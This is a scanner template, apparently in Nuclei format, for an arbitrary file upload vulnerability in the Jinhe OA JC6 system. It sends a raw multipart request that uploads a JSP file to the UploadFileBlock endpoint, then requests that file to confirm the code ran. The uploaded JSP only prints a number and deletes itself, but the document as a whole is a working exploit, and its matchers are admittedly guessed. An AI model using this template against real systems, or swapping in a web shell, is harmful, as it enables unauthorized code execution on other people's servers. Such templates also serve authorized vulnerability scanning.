id: poc-25b338220d493c1b268a
info:
  name: 金和OAJC6UploadFileBlock任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
http:
- raw:
  - 'POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0

    Content-Length: 235

    Accept: */*

    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.8

    Cache-Control: max-age=0

    Connection: close

    Content-Type: multipart/form-data; boundary=bvq7qlachxcoo24vher6


    --bvq7qlachxcoo24vher6

    Content-Disposition: form-data; name="filename"; filename="xfpxtztxot.jsp"


    <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    --bvq7qlachxcoo24vher6--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /jc6/upload/xfpxtztxot.jsp HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0

    Accept: */*

    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.8

    Cache-Control: max-age=0

    Connection: close'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
